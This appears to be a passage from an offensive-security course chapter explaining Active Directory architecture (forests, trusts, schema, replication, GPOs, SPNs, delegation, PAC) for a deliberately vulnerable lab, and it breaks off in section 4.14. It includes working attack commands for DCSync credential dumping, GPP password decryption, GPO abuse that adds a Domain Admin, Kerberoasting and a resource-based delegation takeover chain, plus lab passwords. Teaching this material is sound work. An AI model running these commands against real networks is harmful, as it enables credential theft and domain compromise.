# 04 — Active Directory: What It Is and Why

This is the most important chapter in the curriculum. Active Directory is the largest enterprise identity system on the planet, and every attack later in this book is an abuse of an AD primitive. We will be **excruciatingly precise** here.

By the end of this chapter you will understand:
- What a domain, tree, forest, and trust actually *are* at the LDAP/Kerberos/replication level.
- What the schema is and how attackers extend or abuse it.
- What FSMO roles do and which ones you ZeroLogon.
- How replication works and where DCSync fits in.
- What an OU is, what a GPO is, and how `gpupdate` happens.
- Why DVAD's three-forest topology was chosen.

> Reminder: DVAD is intentionally vulnerable. Run only on a network you own. Treat the VMs as hostile. The lab password and configs are public; do not reuse them anywhere else.

---

## 4.0 The story: why AD exists

Late 1990s. Microsoft owns the enterprise desktop. Each Windows NT 4.0 domain is **flat** — one big bag of users — and has size limits, no proper hierarchy, no delegation, and uses LANMAN/NTLM only. Enterprises with 50,000+ employees are gluing multiple NT4 domains together with primitive trust relationships and it does not scale.

Microsoft looks at Banyan VINES, Novell NDS, and OSF DCE/DFS — all of which had hierarchical X.500-style directories — and ships **Active Directory** with Windows 2000 Server in February 2000.

The big ideas Microsoft committed to:

1. **LDAP v3 as the directory protocol.** Standardized in RFC 2251 (now 4511), queryable, extensible.
2. **DNS-based naming.** A domain is `corp.local`, a host is `dc01.corp.local`. No more NetBIOS-only naming.
3. **Kerberos v5 as the authentication protocol.** Replaces NTLM as the default. NTLM still supported for backward compatibility (NT4 trust relationships, non-domain devices).
4. **Forests, domains, OUs, GPOs.** Hierarchical structure for delegation and policy.
5. **Multi-master replication.** Any DC can write; changes converge via a vector-clock protocol (MS-DRSR).
6. **Trusts between domains, automatic within a forest.** No more painful one-way NT4 trust chains.

Every one of those bullet points has aged with hairline cracks, and **the cracks are the attack surface.** DVAD reproduces them faithfully because that is the point of the lab.

### Versions matter

- **Windows 2000 (NT 5.0)** — first AD. Forest functional level: Windows 2000 Mixed. Schema v13.
- **Server 2003** — selective authentication, forest trusts, RODCs (introduced in 2003 R2's planning, shipped in 2008). Schema v30.
- **Server 2008** — RODCs, fine-grained password policy, Managed Service Accounts (MSAs), AD Recycle Bin (preview). Schema v44.
- **Server 2012 R2** — Authentication policies, Protected Users, gMSAs. Schema v69.
- **Server 2016** — PAM with Microsoft Identity Manager, JEA, Smartcard hardening, Allowed-to-Authenticate enforcement. Schema v87.
- **Server 2019** — minor schema bumps for Defender for Identity. Schema v88.
- **Server 2022** — DVAD default. Schema v88 (most additions land in client-side cmdlets). LDAP channel binding default-on for new installs.
- **Server 2025** — schema bumps for Entra connect modernisation; default kerberos PKINIT hardening per KB5014754.

Functional levels gate features (e.g., gMSAs require Windows Server 2012 forest functional level). DVAD runs at **Windows Server 2016** functional level (chosen for compatibility breadth).

---

## 4.1 Domain, tree, forest

```
                           Forest: corp.local
                                |
                +---------------+---------------+
                |                               |
            corp.local                  finance.local
       (forest root domain)         (External trust to corp;
                |                    its own forest in DVAD)
       +--------+--------+
       |                 |
   eu.corp.local    asia.corp.local
   (child)          (child, illustrative; not in DVAD)

   --- corp.local + eu.corp.local + asia.corp.local share the SAME forest,
       the SAME schema, the SAME configuration partition. ---
   --- finance.local has its own schema, its own configuration partition;
       trust is the bridge. ---
```

### Definitions

- **Domain.** A security and administrative boundary with its own SID prefix, its own DCs, its own user/computer database (`NTDS.dit`). All DCs in a domain replicate that domain's Naming Context (NC) with each other. Has a DNS name (`corp.local`) and a NetBIOS name (`CORP`).
- **Tree.** A set of domains with a **contiguous DNS namespace** linked by automatic parent-child trusts. `corp.local`, `eu.corp.local`, `asia.corp.local` form one tree.
- **Forest.** The outermost boundary. A set of one or more trees that share:
  - A common **schema** (the definition of all object classes and attributes).
  - A common **configuration NC** (sites, services, trusts metadata, PKI containers).
  - A common **global catalog** (forest-wide partial replica).
  - Auto-generated **bidirectional transitive Kerberos trusts** between every domain in the forest.

A forest is **the security boundary.** Domains inside a forest can't fully isolate from each other — Microsoft documents this clearly: "the forest is the security boundary, not the domain." Cross-forest is the meaningful trust line, and even there, SID filtering must be on to keep it tight.

### DVAD's topology in three sentences

DVAD ships three forests: `corp.local` (with `eu.corp.local` as a child), `finance.local` (external trust to corp), and `root.corp` (forest trust to corp). Trusts are deliberately misconfigured: SID filtering is off, the trust keys are well-known (`TrustKey2024!`), and forest-wide attribute name aliases are exposed.

```
+--------------------------------------------+
|  Forest 1: corp.local (2 domains, 1 tree)   |
|    corp.local           dc01.corp.local  10.10.0.10
|    eu.corp.local        dc01.eu.corp.local 10.10.0.11
+--------------------------------------------+
   |                                  |
   |  External trust (one-way)        |  Forest trust (two-way)
   |  SID filtering disabled          |  SID filtering disabled
   |  TGT-routable                    |  TGT-routable, transitive
   v                                  v
+----------------------+         +----------------------+
| Forest 2: finance.local |       | Forest 3: root.corp  |
|  dc01.finance 10.20.0.10|       |  dc01.root 10.30.0.10|
+----------------------+         +----------------------+
```

Three forests because the cross-forest attack matrix (DF-001..040) is the pedagogically richest part of AD security. SID filtering is intentionally disabled — that's the precondition for SID history injection.

---

## 4.2 The directory layout — naming contexts and the global catalog

The AD database (NTDS.dit) is partitioned. Each partition is a **naming context (NC)**:

1. **Schema NC** — `CN=Schema,CN=Configuration,DC=corp,DC=local`. Defines every class and attribute. **Forest-wide.** Read-only after creation except by Schema Admins.
2. **Configuration NC** — `CN=Configuration,DC=corp,DC=local`. Sites, services, trust metadata, PKI containers. **Forest-wide.**
3. **Domain NC** — `DC=corp,DC=local`. Users, groups, computers, OUs. **Per domain.**
4. **Application NCs (optional)** — DNS (`DC=DomainDnsZones,DC=corp,DC=local` and `DC=ForestDnsZones,DC=corp,DC=local`), DFS, etc. May be domain-wide or forest-wide depending on app.

The **Global Catalog** is a *partial read-only copy* of every domain NC in the forest, hosted on flagged DCs. Contains a subset of attributes flagged for GC replication (the schema bit `isMemberOfPartialAttributeSet`). Used for forest-wide searches like "find every user named Alice across all domains." Port: **3268** (LDAP) / **3269** (LDAPS) instead of 389/636.

### LDAP distinguished names (DNs)

An object is identified by its DN, read right-to-left from the root of the directory:

```
CN=alice,CN=Users,DC=corp,DC=local
^      ^         ^      ^
|      |         |      +- top-level domain component
|      |         +- second-level domain component
|      +- container
+- common name
```

OUs use `OU=`. Built-in containers use `CN=`. **OUs can have GPOs linked; CN containers cannot.** This matters for delegation: you can link a GPO to `OU=ServiceAccounts,DC=corp,DC=local` but not to `CN=Users,DC=corp,DC=local`. Default user accounts go in `CN=Users` until an admin moves them — a common mis-design.

### What lives where, briefly

```
DC=corp,DC=local
   CN=Users                 ← default user container (NOT an OU)
       CN=Administrator
       CN=krbtgt
       CN=Domain Admins
       CN=alice
   CN=Computers             ← default computer container (NOT an OU)
       CN=WS01
   CN=System                ← system containers
       CN=AdminSDHolder
       CN=Policies          ← GPO objects (DN-side)
       CN=ForeignSecurityPrincipals  ← cross-domain trustees
   CN=Builtin               ← built-in groups (BUILTIN\Administrators)
   OU=Domain Controllers    ← DCs go here; Default Domain Controllers Policy linked
       CN=DC01
   OU=ServiceAccounts        ← typical custom OU
       CN=svc_sql
       CN=svc_web
```

### Replication scope reminder

- Schema NC → forest-wide. Any DC.
- Configuration NC → forest-wide. Any DC.
- Domain NC → only DCs of that domain.
- Global Catalog → flagged DCs only, partial.
- ForestDnsZones / DomainDnsZones → corresponding scope.

This is why **`certipy find`** can enumerate cert templates from any forest member: the templates are in the Configuration NC, forest-wide. And why **`Get-ADGroupMember` across domains** needs a global catalog query (port 3268).

---

## 4.3 The schema

The schema is the meta-data. Every object class (`user`, `computer`, `group`, `pKICertificateTemplate`, `msDS-GroupManagedServiceAccount`) is defined by a **classSchema** entry. Every attribute (`samAccountName`, `userPrincipalName`, `unicodePwd`, `msDS-AllowedToActOnBehalfOfOtherIdentity`) is defined by an **attributeSchema** entry.

```
classSchema "user"
    governsID:            1.2.840.113556.1.5.9    ← OID, immutable
    subClassOf:            organizationalPerson
    mustContain:           samAccountName, instanceType, objectClass
    mayContain:            userPrincipalName, sn, givenName, mail,
                           memberOf, servicePrincipalName, userAccountControl,
                           unicodePwd, msDS-KeyCredentialLink, ...
    defaultObjectCategory: CN=Person,CN=Schema,...
    defaultSecurityDescriptor: O:DAG:DAD:...

attributeSchema "samAccountName"
    attributeID:           1.2.840.113556.1.4.221
    attributeSyntax:       2.5.5.12 (Directory String)
    isSingleValued:        TRUE
    rangeUpper:            20
    systemFlags:           ...
```

The schema is **forest-wide and additive only.** Once you have added an attribute, you cannot remove it — only **deactivate** (mark `isDefunct=TRUE`). That's why Microsoft prepends Exchange/SCCM/AzureAD schema extensions with namespaced attribute names (`ms-Exch-...`, `ms-Mcs-AdmPwd`, `msDS-...`).

**Schema Admins** is the most powerful group in the forest because schema changes are forest-wide and irreversible. DVAD makes a low-priv user a Schema Admin so you can practice schema-based persistence (PER-029 in PLAN.md). A defender who adds a new attribute can't easily *delete* it after compromise — only deactivate it.

### Schema attacks (preview)

- **Add a malicious default ACE** to `defaultSecurityDescriptor` on `user` class → every new user is created with you as FullControl trustee. Forest-wide. Persistence forever.
- **Plant a new attribute** on the `user` class that nobody checks → store backdoor keys in it.
- **Modify `mayContain`** to allow a hidden side-channel.

Each is detectable via event 5137/5139 (DS object created in Schema NC), but the rate is non-zero in any healthy schema-extending org (Exchange, SCCM upgrades). Noise is the persistence's ally.

---

## 4.4 The trust model

A **trust** lets users from one domain authenticate to resources in another. Trusts have:

- **Direction:** one-way or two-way. "Domain A trusts B" means users from B can use resources in A.
- **Transitivity:** transitive trusts chain — if A trusts B and B trusts C, then A trusts C automatically. Non-transitive trusts don't.
- **Type:** Parent-Child (auto), Tree-Root (auto), External (NTLM-style, non-transitive by default), Forest (transitive between forest roots), Realm (to non-AD Kerberos), Shortcut (intra-forest optimization for big forests).

### Trust types in detail

| Type | Created by | Direction | Transitive | Protocol |
|---|---|---|---|---|
| Parent-Child | `dcpromo` of child | Two-way | Yes | Kerberos |
| Tree-Root | new tree in forest | Two-way | Yes | Kerberos |
| Forest | admin via `netdom`/AD Domains and Trusts | Two-way or one | Yes (within forest) | Kerberos |
| External | admin | One/two-way | No (default) | NTLM + Kerberos |
| Realm | admin to non-AD KDC | One/two-way | optional | Kerberos |
| Shortcut | admin within forest | One/two-way | Yes | Kerberos |

### Trust keys

Every trust has a shared secret — a **trust key**. Two of them actually: one for incoming, one for outgoing referrals. Stored in `CN=TrustedDomain,CN=System,DC=…` as `trustAuthIncoming` / `trustAuthOutgoing` (encrypted). The DC also stores them as LSA secrets under `HKLM\SECURITY\Policy\Secrets\G$$<domain>`.

When a user from `finance.local` authenticates to a resource in `corp.local`, finance's DC issues a **referral TGT** (a TGT *for corp.local*) encrypted with the trust key. corp.local's KDC can decrypt it and issue a service ticket for the corp resource.

If you steal a trust key (e.g., via DCSync on the trusting domain, or via `lsadump::trust` on a compromised DC), you can forge inter-realm TGTs — the **trust ticket forge** attack (DF-007). DVAD sets all trust keys to deterministic `TrustKey2024!` for repeatability of the exercise.

### Forest trust vs external trust

- **External trust:** between two domains, non-transitive by default. Goes back to NT4 trust semantics. Supports NTLM passthrough as well as Kerberos referrals.
- **Forest trust:** between two forest *roots*, transitive across the forest, supports **SID filtering** which can be toggled on/off. Forest trusts assert that the trusted forest's *entire* SID prefix space is foreign-owned; SID filtering enforces that assertion.

When SID filtering is on, SIDs in tickets crossing the trust are scrubbed except for the foreign domain's own SIDs. Off → SID history injection attacks become trivial.

```
A user from finance.local presents a TGT to corp.local for a corp resource.
The TGT's PAC contains:
    extra_sids: [ S-1-5-21-CORP-519 (Enterprise Admins of CORP) ]

With SID filtering ON: corp.local's KDC strips that SID before issuing the TGS.
With SID filtering OFF: corp.local honors the SID -> user is EA on corp.
```

### Quarantine / SID filtering flag

The `trustAttributes` attribute encodes whether quarantine (SID filtering) is enabled:

| Bit (hex) | Name | Meaning |
|---|---|---|
| 0x1 | NON_TRANSITIVE | Non-transitive |
| 0x2 | UPLEVEL_ONLY | 2000+ only |
| 0x4 | QUARANTINED_DOMAIN | SID filtering on |
| 0x8 | FOREST_TRANSITIVE | Forest trust |
| 0x10 | CROSS_ORGANIZATION | Selective authentication |
| 0x20 | WITHIN_FOREST | Intra-forest |
| 0x40 | TREAT_AS_EXTERNAL | Treat as external |

`Get-ADTrust | Format-List Name,TrustAttributes` shows the integer; decode the bits.

---

## 4.5 FSMO roles

While AD is multi-master, five **Flexible Single Master Operation (FSMO)** roles are held by exactly one DC at a time. They exist for operations that must serialize globally.

| Role | Scope | What it does | DVAD holder |
|---|---|---|---|
| **Schema Master** | Forest | Coordinates schema changes | dc01.corp.local |
| **Domain Naming Master** | Forest | Coordinates adding/removing domains | dc01.corp.local |
| **PDC Emulator** | Domain | Authoritative time source; password change preference; GPO writer; SDProp runner; legacy NT4 PDC role | per-domain |
| **RID Master** | Domain | Hands out RID pools (~500 RIDs at a time) to other DCs so they can mint new objects | per-domain |
| **Infrastructure Master** | Domain | Updates cross-domain references (group memberships from other domains) | per-domain |

Check who holds them:

```
PS> netdom query fsmo
Schema master                 dc01.corp.local
Domain naming master          dc01.corp.local
PDC                           dc01.corp.local
RID pool manager              dc01.corp.local
Infrastructure master         dc01.corp.local
```

### Why this matters

- **PDC Emulator** is the canonical ZeroLogon target. The patch enforces Netlogon signing/sealing on the PDC first.
- **PDC Emulator** also runs **SDProp** (AdminSDHolder propagation) — write to AdminSDHolder, wait 60 minutes, the PDC pushes the new SD to every protected account. PER-014.
- **RID Master** failure stops the domain from creating new accounts after the current pool runs out. Operational, not offensive.
- **Schema Master** failure stops schema changes; if you're a Schema Admin attacker, you need this DC online.

In DVAD, FSMO roles default to `dc01.corp.local` for the corp domain.

---

## 4.6 Replication — DRS, MS-DRSR, DCSync

DCs replicate using the **Directory Replication Service (DRS)**, protocol-spec name **MS-DRSR**, transported over DCERPC. The key calls:

- `DRSGetNCChanges` — "send me all changes to NC X since update sequence number Y."
- `DRSCrackNames` — "translate this name from format X to format Y" (used for SID↔name mapping).
- `DRSReplicaAdd` — register a new replica (used by DCShadow).
- `DRSGetReplInfo` — pull replication metadata.

Replication can be **scheduled** (default 15 min within a site, configurable hours across sites) or triggered manually with `repadmin /syncall`.

### Update sequence numbers (USNs)

Every change on every DC gets a per-DC monotonic USN. The replication request says "I last heard from you at USN X; send me everything since." The receiver replies with all changed attributes plus the new high-water-mark USN.

### Replication metadata

Each attribute has a per-attribute version vector. When two DCs disagree, the higher version (with originating-DC USN as tiebreaker) wins. This is **multi-master eventual consistency.**

### DCSync — the attack

Any account with both of these extended rights on the domain root object:

- `DS-Replication-Get-Changes` — GUID `1131f6aa-9c07-11d1-f79f-00c04fc2dcd2`.
- `DS-Replication-Get-Changes-All` — GUID `1131f6ad-9c07-11d1-f79f-00c04fc2dcd2`.

…can call `DRSGetNCChanges` against a DC and request specific objects, including the `unicodePwd`, `dBCSPwd`, and `supplementalCredentials` attributes (NT hash, LM hash, Kerberos keys). The DC happily sends them because it thinks the caller is another DC catching up.

DVAD pre-grants these rights to a low-priv user `sync_user` for `CRED-007`. The technique is:

```bash
impacket-secretsdump -just-dc-user krbtgt corp.local/sync_user:'DVADlab2024!'@10.10.0.10

# Or all hashes
impacket-secretsdump -just-dc corp.local/sync_user:'DVADlab2024!'@10.10.0.10

# As DA (default for Domain Admins members)
impacket-secretsdump -just-dc corp.local/Administrator:'DVADlab2024!'@10.10.0.10
```

For DCSync detection, see chapter 13. The canonical signal is event 4662 with both 1131f6aa and 1131f6ad GUIDs from a non-DC trustee.

### DCShadow — the offensive cousin

Instead of *reading* via DRSGetNCChanges, DCShadow *registers* a rogue DC, *pushes* changes, then unregisters. Targets: any attribute on any object. Default detection is hard (the change looks like normal replication). Mitigations: Defender for Identity, and tight monitoring of `nTDSDSA` object creation in Config NC.

---

## 4.7 Organizational Units (OUs)

OUs are containers for delegation and GPO targeting. They form a tree under the domain root:

```
DC=corp,DC=local
  |
  +-- OU=ServiceAccounts
  |     +-- CN=svc_sql
  |     +-- CN=svc_web
  +-- OU=Workstations
  |     +-- CN=ws01
  +-- OU=Servers
  |     +-- CN=file01
  |     +-- CN=sql01
  +-- OU=Domain Controllers       ← special; holds DCs; Default Domain Controllers Policy linked
  |     +-- CN=dc01
  +-- CN=Users   ← default container, NOT an OU
  |     +-- CN=Administrator
  |     +-- CN=alice
  +-- CN=Computers   ← default container, NOT an OU
```

OUs allow:
- **Linked GPOs** — policies applied to users/computers under that OU.
- **Delegation** — grant another principal rights over the OU (e.g., "helpdesk can reset passwords for `OU=Users`").

### Block inheritance and enforce

- **Block Inheritance** on a child OU: parent GPOs do not apply unless *enforced* upstream.
- **Enforced** on a parent GPO: applies regardless of Block Inheritance, and wins over conflicting child GPOs.

### Delegation patterns to recognise

- Help desk = `ResetPassword` on OU=Users.
- Workstation admin team = `Add/Remove Computer to Domain` + GenericWrite on OU=Workstations.
- Server team = GenericAll on OU=Servers.

If any of those groups also contain a low-priv member you compromised, the OU's delegation becomes your attack path. DVAD seeds at least one such mis-delegation — that's a PE-018-class flag.

### How to inspect

```
PS> Get-ADOrganizationalUnit -Filter * -Properties nTSecurityDescriptor
PS> dsacls "OU=ServiceAccounts,DC=corp,DC=local"
PS> Get-DomainObjectAcl -SearchBase 'OU=ServiceAccounts,DC=corp,DC=local' -ResolveGUIDs |
       Where-Object IdentityReferenceName -eq 'alice'
```

---

## 4.8 Group Policy — GPOs

A **Group Policy Object** is a collection of registry, file, script, and security settings stored in two places:

1. **In AD:** `CN={GUID},CN=Policies,CN=System,DC=corp,DC=local`. Contains the GPO metadata (`gPCFileSysPath`, `versionNumber`, `flags`).
2. **In SYSVOL:** `\\corp.local\SYSVOL\corp.local\Policies\{GUID}\`. Contains the actual settings.

```
{GUID}
  GPT.INI                               ← version / display name
  Machine
    Registry.pol                        ← computer-scope registry settings
    Scripts
      Startup                           ← startup scripts (run as SYSTEM)
      Shutdown
    Preferences
      Groups
        Groups.xml                      ← local-group changes (and historical GPP password)
      ScheduledTasks
        ScheduledTasks.xml
      Services
        Services.xml
      Files
        Files.xml
  User
    Registry.pol                        ← user-scope registry settings
    Scripts
      Logon                             ← user logon scripts (run as user)
      Logoff
```

### When does it apply?

- **Computer settings** at boot, then every ~90 minutes (with ~30 min jitter).
- **User settings** at logon, then every ~90 minutes.
- **Manual:** `gpupdate /force` (and `/boot` for some computer settings).
- **Order:** LSDOU = Local → Site → Domain → OU (innermost OU last). Later wins. *Enforced* GPOs win over child Block-Inheritance.

### Why GPOs matter to attackers

- **SYSVOL is world-readable** to authenticated domain users. Anyone with valid creds can browse it.
- **Historical sin: GPP passwords.** Group Policy Preferences (introduced 2008) supported configuring local accounts via GPO. The password was stored in `Groups.xml` etc. encrypted with **a static AES key Microsoft published in MSDN**. Anyone could decrypt. MS-14-025 (June 2014) deprecated GPP password storage. Old GPOs lingered for years. DVAD seeds at least one as CRED-006.
- **GPO write = host compromise.** If you can edit a GPO that targets DCs, you can drop a startup script that runs as SYSTEM on every DC. That is an Enterprise-Admin-grade primitive. PE-038 / PER-021.
- **Logon scripts execute as the user.** If you can modify a logon-script GPO linked to an OU that contains Domain Admins, you can capture or run code as DA the next time one logs on.

DVAD includes a misconfigured GPO with weak ACLs as a PE-* and PER-* vector.

### Tools

```
# Read GPP cpassword
gpp-decrypt 'edBSHOwhZLTjt/QS9FeIcJ83mjWA98gw9guKOhJOdcqh+ZGMeXOsQbCpZ3xUjTLfCuNH8pG5aSVYdYw/NglVmQ'
# Returns: SuperSecretPass123!

# Edit a GPO (offensive)
SharpGPOAbuse.exe --AddComputerScript --GPOName "Default Domain Policy" --ScriptName evil.bat --ScriptContents "net group 'Domain Admins' alice /add /domain"

# Or via PowerShell / pyGPOAbuse on Kali
pyGPOAbuse.py corp.local/alice:'DVADlab2024!' -gpo-id "{31B2F340-016D-11D2-945F-00C04FB984F9}" -powershell -command "<base64 PS>"
```

### Detection

- 5136 on DC for changes to the GPO LDAP object.
- 5145 on DCs for SYSVOL write.
- 4663 on the SYSVOL file.
- Sysmon FileCreate (11) on Registry.pol.

---

## 4.9 Sites and subnets

A **site** is a network location — typically a physical office. AD uses sites to:

- Control replication frequency (within-site default 15 min, between-site configurable).
- Direct clients to the **closest DC** (DC Locator algorithm).

```
AD Sites and Services:
  Sites
    Default-First-Site-Name
      Subnets: 10.10.0.0/21
      Servers: dc01.corp.local
    Site-Singapore
      Subnets: 192.168.50.0/24
      Servers: dc02.corp.local
    InterSiteTransports
      IP (RPC over IP, sync)
      SMTP (rarely used, async)
```

A client looks up its site via the **DC locator** (`DsGetDcName`). The client provides its IP; the locator finds the matching subnet object and returns the site's DC list.

DVAD has a single site since the lab is small. The concept matters for two reasons:

1. **Replication choke points.** Inter-site replication can be hours apart, meaning DCSync from one DC may take time to propagate. Operational, rarely offensive.
2. **NetBIOS / LLMNR poisoning happens within a site/broadcast domain.** Site topology mirrors network topology mostly.

---

## 4.10 User Account Control (UAC) flags

The `userAccountControl` attribute on every account is a 32-bit bitmask. Important bits:

| Bit | Decimal | Hex | Name | Effect |
|---|---|---|---|---|
| 1 | 2 | 0x2 | ACCOUNTDISABLE | Account disabled |
| 4 | 16 | 0x10 | LOCKOUT | Locked out |
| 5 | 32 | 0x20 | PASSWD_NOTREQD | Password not required |
| 6 | 64 | 0x40 | PASSWD_CANT_CHANGE | Cannot change password |
| 7 | 128 | 0x80 | ENCRYPTED_TEXT_PWD_ALLOWED | Reversibly-encrypted password (BAD; gives plaintext via DCSync) |
| 9 | 512 | 0x200 | NORMAL_ACCOUNT | Standard user |
| 11 | 2048 | 0x800 | INTERDOMAIN_TRUST_ACCOUNT | Trust account |
| 12 | 4096 | 0x1000 | WORKSTATION_TRUST_ACCOUNT | Workstation/server machine account |
| 13 | 8192 | 0x2000 | SERVER_TRUST_ACCOUNT | DC machine account |
| 16 | 65536 | 0x10000 | DONT_EXPIRE_PASSWORD | Password never expires |
| 19 | 524288 | 0x80000 | TRUSTED_FOR_DELEGATION | Unconstrained delegation |
| 20 | 1048576 | 0x100000 | NOT_DELEGATED | Sensitive; account cannot be delegated |
| 21 | 2097152 | 0x200000 | USE_DES_KEY_ONLY | DES only |
| 22 | 4194304 | 0x400000 | **DONT_REQ_PREAUTH** | AS-REP roastable |
| 23 | 8388608 | 0x800000 | PASSWORD_EXPIRED | |
| 24 | 16777216 | 0x1000000 | TRUSTED_TO_AUTH_FOR_DELEGATION | Constrained delegation with protocol transition |

### LDAP bit-AND filter

```
(&(objectClass=user)(userAccountControl:1.2.840.113556.1.4.803:=4194304))
```

That's "user with DONT_REQ_PREAUTH bit set" — AS-REP roastable. The OID `1.2.840.113556.1.4.803` is the LDAP `bitAndRule` matching rule.

### Hunting one-liners

```
# AS-REP roastable
Get-ADUser -LDAPFilter '(userAccountControl:1.2.840.113556.1.4.803:=4194304)'

# Unconstrained delegation (users + computers)
Get-ADObject -LDAPFilter '(userAccountControl:1.2.840.113556.1.4.803:=524288)'

# Trusted for constrained delegation w/ protocol transition
Get-ADObject -LDAPFilter '(userAccountControl:1.2.840.113556.1.4.803:=16777216)'

# Passwords don't expire (suggests stale, often reused passwords)
Get-ADUser -LDAPFilter '(userAccountControl:1.2.840.113556.1.4.803:=65536)'

# Account is sensitive (not delegated)
Get-ADUser -LDAPFilter '(userAccountControl:1.2.840.113556.1.4.803:=1048576)'

# Has reversibly-encrypted password — DCSync gives plaintext
Get-ADUser -LDAPFilter '(userAccountControl:1.2.840.113556.1.4.803:=128)'
```

---

## 4.11 Service Principal Names (SPNs)

An **SPN** is a Kerberos identifier for a service running as a particular account:

```
<service-class>/<host>:<port>/<service-name>
```

Examples:

- `cifs/file01.corp.local` — SMB on file01.
- `MSSQLSvc/sql01.corp.local:1433` — MSSQL default instance on sql01.
- `HTTP/owa.corp.local` — HTTP service (Exchange/IIS Kerberos).
- `LDAP/dc01.corp.local` — LDAP on the DC.
- `host/dc01.corp.local` — host service (generic; machine).
- `GC/dc01.corp.local` — Global Catalog.
- `TERMSRV/ws01.corp.local` — Remote Desktop.

SPNs are stored on the *account that runs the service*, in the `servicePrincipalName` multi-valued attribute:

- Computer accounts have implicit SPNs (`HOST/...`, `RestrictedKrbHost/...`, plus per-protocol variants).
- Service user accounts get SPNs added via `setspn -A <SPN> <user>` or `Set-ADUser -ServicePrincipalNames @{Add='svc/spn'}`.

**Why this matters for Kerberoasting:** to request a service ticket, the client only needs the SPN. The KDC returns a ticket *encrypted with the service account's password-derived key*. If that account is a normal user with a weak password (and especially if RC4 is allowed), you can crack the key offline.

### SPN syntax rules

- Case-insensitive.
- Service-class is the *Kerberos service*, not the binary (`cifs`, `host`, `HTTP`, `MSSQLSvc`, `TERMSRV`).
- Host should be a DNS name (FQDN preferred) — a NetBIOS name is allowed but reduces flexibility.
- Port optional.
- Service-name optional and rare except for MSSQL named instances.

### Discovery

```bash
impacket-GetUserSPNs corp.local/alice:'DVADlab2024!' -dc-ip 10.10.0.10
# or
ldapsearch -x -H ldap://10.10.0.10 -D 'alice@corp.local' -w '…' -b 'DC=corp,DC=local' \
  '(&(servicePrincipalName=*)(!objectClass=computer))' samAccountName servicePrincipalName
```

DVAD has multiple kerberoastable accounts (`svc_sql`, `svc_web`, `svc_backup`) with weak passwords baked in for CRED-001.

### writeSPN abuse (Targeted Kerberoast / setspn against arbitrary user)

If you have `GenericWrite` (or specifically `writeProperty` on `servicePrincipalName`) over a user, you can:

1. Add an SPN to them: `setspn -s fake/spn target_user`.
2. Roast them by requesting a TGS for that SPN.
3. Remove the SPN to clean up.

This converts any GenericWrite ACE into a "crack this user's password offline." PE-024 family.

---

## 4.12 Delegation — the rabbit hole

Kerberos delegation lets a service authenticate to a backend service on behalf of a user (think: a web app talks to a SQL backend as the user, not as the web app's account).

Three flavors:

### 4.12.1 Unconstrained delegation (TRUSTED_FOR_DELEGATION)

Worst design choice in AD. When a user authenticates to a service marked "trusted for delegation," the user's *full forwardable TGT* is stored in the service's memory. Anyone who compromises that service host can extract the TGT and impersonate every user who has ever authenticated to it.

DCs are implicitly unconstrained — that's why coercion attacks against DCs are catastrophic when there's a relayable target. Worse: if a regular service is marked unconstrained, a coercion that targets *it* (PrinterBug pointing at the service) makes the DC machine account authenticate to the service. The service now has a TGT for `DC01$` → DCSync.

DVAD: `svc_legacy` is unconstrained. `FILE01$` may also be unconstrained for some lab variants.

### 4.12.2 Constrained delegation (TRUSTED_TO_AUTH_FOR_DELEGATION + msDS-AllowedToDelegateTo)

A whitelist: this service may impersonate users *only to these specific SPNs*. Two sub-flavors:

- **Without protocol transition (Kerberos-only).** The service receives a user's forwarded TGT, then uses **S4U2Proxy** to ask the KDC for a TGS to a backend SPN.
- **With protocol transition (any auth → Kerberos).** The service can do **S4U2Self** first (synthesize a TGS for any user, no password needed!) then S4U2Proxy to a backend. Anyone who compromises this service can impersonate anyone to a backend service — usually game over.

**Impact:** anyone with compromised access to a service marked `TRUSTED_TO_AUTH_FOR_DELEGATION` can pivot to the backend SPNs in `msDS-AllowedToDelegateTo`.

### 4.12.3 Resource-based constrained delegation (RBCD) — `msDS-AllowedToActOnBehalfOfOtherIdentity`

Inverted model: instead of telling service A "you can delegate to B," you tell **B**: "trust A's S4U2Self for me." The attribute lives on the *target*, configurable by anyone with `WriteProperty` on it. This is the most attacker-friendly form because:

1. `MachineAccountQuota=10` lets any authenticated domain user create up to 10 computer accounts (the user becomes `mS-DS-CreatorSID`).
2. Create `BADCOMP$` via `impacket-addcomputer`, get its NT hash (or pick the password).
3. If you have `GenericWrite` on `B` (say, `FILE01$`), set `B.msDS-AllowedToActOnBehalfOfOtherIdentity` to a security descriptor allowing `BADCOMP$`.
4. From `BADCOMP$`, do **S4U2Self** for `Administrator` against `B` → get a service ticket → admin on B.

```bash
# Create attacker computer
impacket-addcomputer -computer-name 'BADCOMP$' -computer-pass 'BadComp123!' \
    -dc-host dc01.corp.local corp.local/alice:'DVADlab2024!'

# Write the RBCD
impacket-rbcd corp.local/alice:'DVADlab2024!' -delegate-from 'BADCOMP$' \
    -delegate-to 'FILE01$' -action write -dc-host dc01.corp.local

# S4U2Self impersonating Administrator
impacket-getST -spn 'cifs/file01.corp.local' -impersonate Administrator \
    corp.local/'BADCOMP$':'BadComp123!' -dc-ip 10.10.0.10

# Use the ticket
KRB5CCNAME=Administrator@cifs_file01.corp.local@CORP.LOCAL.ccache impacket-secretsdump \
    -k -no-pass file01.corp.local
```

DVAD provisions exactly this RBCD vulnerability on `FILE01$` for `CRED-019`.

### Why RBCD is so productive

- The write is one attribute.
- The attacker controls everything from there.
- Lowering `MachineAccountQuota=0` kills the attack at the precondition.
- Removing GenericWrite ACEs on Tier-0 computer objects kills it too.

---

## 4.13 The PAC — Privilege Attribute Certificate

Kerberos tickets in Windows carry a **PAC** — a Microsoft extension blob in the ticket's `AuthorizationData` field. The PAC contains:

- The user's SID and group SIDs.
- "ExtraSIDs" (for cross-domain trust additions).
- Username, logon time, logon domain.
- Logon server.
- Two signatures:
  - **Server signature** — checksum over the ticket, signed with the service's key (so the service can verify the PAC came from the KDC).
  - **KDC signature** — checksum over the server signature, signed with **krbtgt's** key (so the service can ask the KDC to validate the whole PAC).
- (May 2022 patches add) **Full PAC signature**, **Ticket signature** — additional checks for ticket integrity.

When a service receives a ticket, it can read the PAC to make authorization decisions without re-querying the DC. Most services do not validate the KDC signature against the KDC — that's the PAC validation lapse exploited by Golden Tickets (forged with krbtgt key) and Sapphire/Diamond tickets (PAC manipulation post-KDC).

**KB5008380 / KB5020805 (Nov 2021 / Nov 2022)** added enforcement-mode PAC validation that closes most forgery loopholes. DVAD does *not* apply these patches by default. Production hosts should.

---

## 4.14 The Configuration NC and what it leaks

Stuff stored in `CN=Configuration,...` is read-by-everyone (Authenticated Users / Domain Users):

- **Sites and subnets** — network map of the org.
